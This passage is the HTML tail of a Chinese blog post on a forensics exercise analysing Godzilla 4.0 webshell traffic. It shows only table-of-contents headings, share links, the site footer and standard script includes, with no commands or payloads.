href="#%E4%BB%80%E4%B9%88%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E5%BD%93%E5%89%8D%E7%9A%84%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC%EF%BC%9F"><span class="toc-number">4.8.2.</span> <span class="toc-text">什么命令可以查看到当前的发行版本？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-lsb-release%E5%91%BD%E4%BB%A4"><span class="toc-number">4.8.2.1.</span> <span class="toc-text">1.lsb_release命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cat-etc-os-release"><span class="toc-number">4.8.2.2.</span> <span class="toc-text">2.cat  &#x2F;etc&#x2F;os-release</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-uname%E5%91%BD%E4%BB%A4"><span class="toc-number">4.8.2.3.</span> <span class="toc-text">3.uname命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E9%BB%91%E5%AE%A2%E5%88%A9%E7%94%A8webshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%BF%98%E6%9F%A5%E8%AF%A2%E5%B9%B6%E8%BF%87%E6%BB%A4%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88%E6%8F%90%E4%BA%A4%E6%95%B4%E6%9D%A1%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">4.9.</span> <span class="toc-text">9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E5%90%8E%E9%97%A8%E7%9A%84%E5%8F%8D%E8%BF%9E%E7%9A%84IP%E5%92%8CPORT%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88IP-PORT"><span class="toc-number">4.10.</span> <span class="toc-text">10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88Reverse-Connection%EF%BC%89%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.10.1.</span> <span class="toc-text">反向连接（Reverse Connection）是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E5%92%8C-PORT%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.10.2.</span> <span class="toc-text">IP 和 PORT是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81%E9%BB%91%E5%AE%A2%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E7%95%99%E4%B8%8B%E4%BA%86%E5%90%8E%E9%97%A8%EF%BC%9F"><span class="toc-number">4.11.</span> <span class="toc-text">11、黑客通过什么文件留下了后门？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">4.11.1.</span> <span class="toc-text">什么是后门文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.11.2.</span> <span class="toc-text">后门文件的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getFiledirName-%E6%96%B9%E6%B3%95"><span class="toc-number">4.11.3.</span> <span class="toc-text">getFiledirName 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E7%9B%AE%E7%9A%84"><span class="toc-number">4.11.4.</span> <span class="toc-text">后门目的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81%E9%BB%91%E5%AE%A2%E8%AE%BE%E7%BD%AE%E7%9A%84%E5%90%8E%E9%97%A8%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.12.</span> <span class="toc-text">12、黑客设置的后门密码是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81%E9%BB%91%E5%AE%A2%E7%9A%84%E6%81%B6%E6%84%8Fdnslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.13.</span> <span class="toc-text">13、黑客的恶意dnslog服务器地址是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFdnslog%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F"><span class="toc-number">4.13.1.</span> <span class="toc-text">什么是dnslog服务器？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">4.13.1.1.</span> <span class="toc-text">DNSLog 服务器的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">4.13.1.2.</span> <span class="toc-text">DNSLog 服务器的用途</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.13.1.3.</span> <span class="toc-text">DNSLog 服务器的特点</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&text=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&is_video=false&description=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机第六章哥斯拉4.0流量分析&body=Check out this article: https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&name=玄机第六章哥斯拉4.0流量分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&t=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
